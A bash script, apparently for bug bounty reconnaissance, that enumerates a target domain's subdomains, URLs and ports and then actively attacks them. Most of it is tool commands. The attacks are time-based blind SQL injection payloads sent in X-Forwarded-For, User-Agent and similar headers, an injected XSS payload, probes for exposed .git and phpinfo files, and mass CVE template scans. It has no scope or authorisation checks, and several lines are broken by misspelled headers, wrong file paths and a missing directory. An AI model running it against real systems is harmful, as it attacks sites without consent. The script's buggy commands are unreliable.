#!/bin/bash

# Define colors
CYAN='\033[1;36m'
RESET='\033[0m'
GREEN='\033[0;32m'
NUCLEI_COLOR='\033[0;34m'  # Color for Nuclei output

# Display the logo in light cyan
echo -e """${CYAN}
░█▀▀█ █░░ █▀▄▀█ ░▀░ █▀▀▀ █░░█ ▀▀█▀▀ █░░█ 
▒█▄▄█ █░░ █░▀░█ ▀█▀ █░▀█ █▀▀█ ░░█░░ █▄▄█ 
▒█░▒█ ▀▀▀ ▀░░░▀ ▀▀▀ ▀▀▀▀ ▀░░▀ ░░▀░░ ▄▄▄█${RESET}"""
# Usage function to display how to use the script
usage() {
    echo "Usage: $0 -d <target_domain>"
    exit 1
}

# Parse the command-line arguments
while getopts ":d:" opt; do
    case "${opt}" in
        d)
            TARGET_DOMAIN=${OPTARG}
            ;;
        *)
            usage
            ;;
    esac
done

# Check if the target domain was provided
if [ -z "${TARGET_DOMAIN}" ]; then
    usage
fi

echo -e "${GREEN}Creatinng Subdmain Directory${CYAN}"
mkdir Subdomains
echo -e "${CYAN}Complete${RESET}"

echo -e "${GREEN}Running Subfinder , Anew , and Httpx...${}"
echo ${TARGET_DOMAIN} | subfinder | anew | httpx >> Subdomains/subdomains.txt
echo -e "${CYAN}Complete${RESET}"

echo -e "${GREEN}Running Httpx Scanning for sensitive files...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -path "/server-status" -mc 200 -title > Subdomains/httpx-Server-status.txt
cat Subdomains/subdomains.txt | httpx -silent -path "/phpinfo.php" -mc 200 -title > Subdomains/httpx-phpinfo
cat Subdomains/subdomains.txt | httpx -silent -path "/.DS_Store" -mc 200 -title > Subdomains/httpx-DS_store.txt
cat Subdomains/subdomains.txt | httpx -silent -path "/.git" -mc 200 -title > Subdomains/httpx-git.txt
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Running Httpx...${RESET}"
cat Subdomains/subdomains.txt | httpx -sc -title -cl --tech-detect >> Subdomains/httpx-details.txt
echo -e "${CYAN}Complete${RESET}"

# Running naabu
echo -e "${GREEN}Running Naabu...${RESET}"
cat subdomains.txt | naabu --passive -silent > Subdomains/ports.txt
echo -e "${CYAN}Task Completed!${RESET}"

# Running Subzy
echo -e "${GREEN}Running Subzy and checking for subdomain takeovers...${RESET}"
subzy run --targets Subddomains/subdomains.txt >> Subdomains/subzy.txt
echo -e "${CYAN}Task Completed!${RESET}"

# Running SQLi X-Forwarded-For
echo -e "${GREEN}Running SQLi attack using X-Forwarded-For...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwraded-For:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-X-Forwarded-For.txt
echo -e "${CYAN}Task Completed!${RESET}"

# Running SQLi X-Forwarded-Host
echo -e "${GREEN}Running SQLi attack using X-Forwarded-Host...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -H "X-Forwraded-Hostr:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-X-Forwarded-Host.txt
echo -e "${CYAN}Task Completed!${RESET}"

# Running SQLi X-Forwarded-Host
echo -e "${GREEN}Running SQLi attack using User-Agent...${RESET}"
cat Subdomains/subdomains.txt | httpx -silent -H "User-Agent:'XOR(if(now()=sysdate(),sleep(15),0))XOR'" -rt -timeout 20 -mrt '>10' > Subdomains/SQLi-User-Agent.txt
echo -e "${CYAN}Task Completed!${RESET}"

echo -e "${GREEN}Creating nuclei directory...${RESET}"
mkdir Subdomains/nuclei
echo -e "${CYAN}Task Completed!${RESET}"

# Running Nuclei for subdomain takeovers
echo -e "${GREEN}Running Nuclei for possible subdomain takeovers...${RESET}"
cat Subdomains/subdomains.txt | nuclei -silent -t /$HOME/nuclei-templates/http/takeovers/*.yaml > Subdomains/nuclei/nuclei-subover.txt
echo -e "${CYAN}Task Completed!${RESET}"

# Loop through the years 2000 to 2024 for CVE templates
for year in {2000..2024}; do
    echo -e "${GREEN}Running Nuclei template for year $year...${RESET}"
    cat subdomains.txt | uro | anew | nuclei -silent -rate-limit 200 -t /$HOME/nuclei-templates/http/cves/$year/*.yaml > Subdomains/nuclei/nuclei-$year.txt
done

# Activate the virtual environment (modify the path if needed)
source /home/bugbounty450/venv/bin/activate

mkdir urls

# Run katana and clean the output without displaying its logo
echo -e "${GREEN}Running Katana${RESET}"
echo "${TARGET_DOMAIN}" | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault > urls/katana.txt
cat urls/katana.txt | uro > urls/katana-clean.txt
echo -e "${GREEN}Task finished${RESET}"

# Run gau and clean the output
echo -e "${GREEN}Running GAU${RESET}"
echo "${TARGET_DOMAIN}" | gau --subs > urls/gau.txt
cat urls/gau.txt | uro > urls/gau-clean.txt
echo -e "${GREEN}Task finished${RESET}"

# Run waybackurls and clean the output
echo -e "${GREEN}Running Waybackurls...${RESET}"
waybackurls "${TARGET_DOMAIN}" > urls/waybackurls.txt
cat urls/waybackurls.txt | uro > urls/waybackurls-clean.txt
echo -e "${GREEN}Task finished${RESET}"

# Combine all cleaned outputs and remove intermediate files
echo -e "${GREEN}Combining all URLs${RESET}"
cat urls/katana-clean.txt urls/gau-clean.txt urls/waybackurls-clean.txt > urls/final-clean.txt
rm urls/katana-clean.txt urls/gau-clean.txt urls/waybackurls-clean.txt
echo -e "${GREEN}Task Completed${RESET}"

# Check for possible XSS vulnerabilities
echo -e "${GREEN}Checking for possible XSS vulnerabilities...${RESET}"
cat urls/final-clean.txt | gf xss | uro | qsreplace '"><img src=x onerror=alert("XSS")>' | 
while read -r host; do 
    if curl -sk --path-as-is "$host" | grep -qs '"><img src=x onerror=alert("XSS")>'; then 
        echo "$host is vulnerable" >> urls/possible-xss.txt
    fi
done

# Run gf for possible SQLi
cat urls/final-clean.txt | gf sqli | uro > urls/sqli.txt

# Run gf for open-redirect
cat urls/final-clean.txt | gf redirect | uro | egrep -iv "wp-" > urls/open-redirect.txt

# Run gf for ssrf
cat urls/final-clean.txt | gf ssrf | uro > urls/ssrf.txt

# Run gf for rce
cat urls/final-clean.txt | gf rce | uro > urls/rce.txt

# Run gf for lfi
cat urls/final-clean.txt | gf lfi | uro > urls/lfi.txt

# Run for gf interesting extensions
cat urls/final-clean.txt | gf interestingEXT | uro > urls/interesting-extentions.txt

# Run for gf interesting params
cat urls/final-clean.txt | gf interestingparams | uro > urls/interesting-params.txt

# Run for gf debug_logic
cat urls/final-clean.txt | gf debug_logic | uro > urls/debug-logic.txt

# Run for gf traversal
cat urls/final-clean.txt | gf img-traversal | uro > urls/img-traversal.txt

# Run for gf ssti
cat urls/final-clean.txt | gf ssti | uro > urls/ssti.txt

# Run nuclei
mkdir nuclei
for i in {2000..2024}; do
    echo -e "${NUCLEI_COLOR}Running Nuclei template $i${RESET}"
    cat urls/final-clean.txt | uro | nuclei -silent -rate-limit 200 -t /$HOME/nuclei-templates/http/cves/$i/*.yaml > urls/nuclei/nuclei-$i.txt
done
echo -e "${GREEN}Process complete!${RESET}"
